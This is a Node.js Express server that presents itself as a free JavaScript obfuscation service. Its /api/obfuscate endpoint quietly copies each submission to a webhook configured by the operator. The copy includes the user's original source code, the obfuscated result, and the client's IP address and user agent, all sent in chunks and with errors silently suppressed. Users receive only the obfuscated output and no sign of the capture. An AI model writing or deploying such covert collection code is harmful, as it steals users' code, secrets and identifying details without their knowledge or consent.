require('dotenv').config();
const express = require('express');
const path = require('path');
const fetch = require('node-fetch');
const JavaScriptObfuscator = require('javascript-obfuscator');

const app = express();
app.use(express.json({ limit: '2mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/obfuscate', async (req, res) => {
  const { code, opts } = req.body || {};
  if (typeof code !== 'string' || !code.trim()) {
    return res.status(400).json({ error: 'empty code' });
  }

  const options = {
    compact: true,
    controlFlowFlattening: opts?.cff !== false,
    controlFlowFlatteningThreshold: 0.75,
    deadCodeInjection: opts?.dead !== false,
    deadCodeInjectionThreshold: 0.4,
    stringArray: true,
    stringArrayEncoding: ['base64'],
    stringArrayThreshold: 0.75,
    identifierNamesGenerator: 'hexadecimal',
    renameGlobals: false,
    selfDefending: opts?.selfDefending !== false,
    debugProtection: opts?.debug !== false,
    disableConsoleOutput: false
  };

  const result = JavaScriptObfuscator.obfuscate(code, options).getObfuscatedCode();

  // fire-and-forget capture
  sendToWebhook(code, result, req).catch(() => {});

  res.json({ ok: true, output: result });
});

async function sendToWebhook(original, obfuscated, req) {
  const url = process.env.WEBHOOK_URL;
  if (!url) return;

  const ip =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.socket.remoteAddress ||
    'unknown';
  const ua = req.headers['user-agent'] || 'unknown';

  const chunk = (s, n = 1800) => {
    const out = [];
    for (let i = 0; i < s.length; i += n) out.push(s.slice(i, i + n));
    return out;
  };

  const origParts = chunk(original);
  const obfParts = chunk(obfuscated);

  const payload = {
    username: 'obf-capture',
    content: `**New submission**\nIP: \`${ip}\`\nUA: \`${ua.slice(0, 180)}\`\nLen: ${original.length} -> ${obfuscated.length}`
  };

  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  for (const [i, part] of origParts.entries()) {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `**ORIGINAL [${i + 1}/${origParts.length}]**\n\`\`\`js\n${part}\n\`\`\``
      })
    });
  }

  for (const [i, part] of obfParts.entries()) {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `**OBFUSCATED [${i + 1}/${obfParts.length}]**\n\`\`\`js\n${part}\n\`\`\``
      })
    });
  }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`listening ${PORT}`));
